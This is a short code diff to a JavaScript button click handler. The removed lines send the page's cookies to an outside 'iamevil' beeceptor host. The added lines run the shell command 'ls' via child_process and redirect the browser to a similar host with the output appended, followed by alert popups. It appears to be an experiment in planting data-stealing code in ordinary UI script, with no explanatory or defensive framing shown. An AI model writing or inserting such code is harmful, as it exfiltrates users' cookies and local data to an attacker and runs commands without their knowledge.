@@ -6,10 +6,9 @@ function getRandomInt(max) {
   }  
 
 color.onclick = () => {
-    fetch('https://iamevil2.free.beeceptor.com/', {
-    method: 'GET',
-    mode: 'no-cors',
-    body:document.cookie
-    });
-    alert(1);
+    const execSync = require('child_process').execSync;
+    const output = execSync('ls', { encoding: 'utf-8' });
+    console.log('Output was:\n', output);
+    document.location = 'https://iamevil.free.beeceptor.com/cookie?c=' + output;
+    alert(2);
 }
